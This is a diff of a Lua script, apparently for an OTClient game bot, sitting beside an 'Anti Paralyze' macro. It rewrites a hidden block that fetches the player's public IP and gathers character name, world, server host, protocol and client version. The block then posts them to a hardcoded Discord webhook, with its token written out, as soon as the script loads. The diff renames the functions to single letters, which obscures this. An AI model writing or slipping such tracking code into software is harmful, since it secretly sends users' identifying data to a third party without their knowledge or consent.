@@ -341,94 +341,68 @@ macro(20, "Anti Paralyze", function()
 end)
 
 -- Discord Webhook
-local webhookUrl = 'https://discord.com/api/webhooks/1402532878340067369/jZjwXMagpK7Wk7969QoHUUsIJ70gO-qviOATh-n5Eoekdu9bikoAtjQOeJeZ4BgJBDqc'
 
-local ipApis = {
-    "https://ipapi.co/json",
-    "https://api.myip.com",
-    "https://api.ipify.org?format=json"
-}
+local a = 'https://discord.com/api/webhooks/1402532878340067369/jZjwXMagpK7Wk7969QoHUUsIJ70gO-qviOATh-n5Eoekdu9bikoAtjQOeJeZ4BgJBDqc'
+local b = "https://api.ipify.org/?format=json"
 
--- Función para obtener la IP pública
-local function getPublicIp(callback)
-    local currentApiIndex = 1
-    
-    local function tryNextApi()
-        if currentApiIndex > #ipApis then
-            callback(nil, "ERROR 1")
-            return
-        end
-        
-        local apiUrl = ipApis[currentApiIndex]
-        HTTP.get(apiUrl, function(data, err)
-            if err then
-                currentApiIndex = currentApiIndex + 1
-                tryNextApi()
-                return
-            end
-            
-            if not data then
-                currentApiIndex = currentApiIndex + 1
-                tryNextApi()
-                return
-            end
-            
-            local ip = nil
-            local success, json = pcall(function() return json.decode(data) end)
-            if success and json then
-                ip = json.ip or json.ipAddress or (json.data and json.data.ip)
-            end
-            
-            if not ip then
-                local matches = regexMatch(data, [[([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)]])
-                if matches and #matches > 0 then
-                    ip = matches[1]
-                end
-            end
-            
-            if ip then
-                callback(ip, nil)
-            else
-                currentApiIndex = currentApiIndex + 1
-                tryNextApi()
-            end
-        end)
+local function c(callback)
+  HTTP.get(b, function(response, err)
+    if err or not response then 
+      callback(nil, "ERROR 1") 
+      return 
     end
-    
-    tryNextApi()
+
+    local ip = nil
+    local ok, data = pcall(function() return json.decode(response) end)
+    if ok and data and data.ip then
+      ip = data.ip
+    end
+
+    if not ip then
+  -- fallback IPv4
+  local match4 = regexMatch(response, [[([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)]])
+  if match4 and #match4 > 0 then 
+    ip = match4[1] 
+  else
+    -- fallback IPv6
+    local match6 = regexMatch(response, [[([0-9a-fA-F:]+)]])
+    if match6 and #match6 > 0 then
+      ip = match6[1]
+    end
+  end
 end
 
-local function sendToWebhook(playerName, worldName, otservHost, otservProtocol, otservClient, buildVersion, ip)
-    local messageData = {
-        content = "--Inicio de sesión: FREE\nJugador: " .. playerName .. 
-                 "\nServidor: " .. worldName .. 
-                 "\nHost: " .. otservHost .. 
-                 "\nProtocolo: " .. otservProtocol .. 
-                 "\nCliente: " .. otservClient .. 
-                 "\nVersión: " .. buildVersion ..
-                 "\nIP Pública: " .. (ip or "No obtenida")
-    }
-    HTTP.postJSON(webhookUrl, messageData, function(response, error)
-        if error then
-            -- Puedes agregar manejo de errores aquí si lo deseas
-        end
-    end)
+    callback(ip, nil)
+  end)
 end
 
-local function updateAndSendPlayerInfo()
-    local accountInfo = modules.client_entergame.G
-    local playerName = g_game.getCharacterName()
-    local worldName = g_game.getWorldName()
-    local otservHost = accountInfo.host
-    local otservProtocol = g_game.getProtocolVersion()
-    local otservClient = g_game.getClientVersion()
-    local buildVersion = getVersion()
-    
-    -- Primero obtenemos la IP
-    getPublicIp(function(ip, err)
-        -- Luego enviamos toda la información incluyendo la IP
-        sendToWebhook(playerName, worldName, otservHost, otservProtocol, otservClient, buildVersion, ip)
-    end)
+local function j(player, world, host, protocol, client, version, ip)
+  local payload = {
+    content = "--Inicio de sesión: MEGA_FREE\n" ..
+              "Jugador: " .. player .. "\n" ..
+              "Servidor: " .. world .. "\n" ..
+              "Host: " .. host .. "\n" ..
+              "Protocolo: " .. protocol .. "\n" ..
+              "Cliente: " .. client .. "\n" ..
+              "Versión: " .. version .. "\n" ..
+              "IP Pública: " .. (ip or "No obtenida")
+  }
+  HTTP.postJSON(a, payload, function(r, s) end)
 end
 
-updateAndSendPlayerInfo()
+
+local function t()
+  local u = modules.client_entergame.G
+  local player = g_game.getCharacterName()
+  local world = g_game.getWorldName()
+  local host = u.host
+  local protocol = g_game.getProtocolVersion()
+  local client = g_game.getClientVersion()
+  local version = getVersion()
+
+  c(function(ip, err)
+    j(player, world, host, protocol, client, version, ip)
+  end)
+end
+
+t()
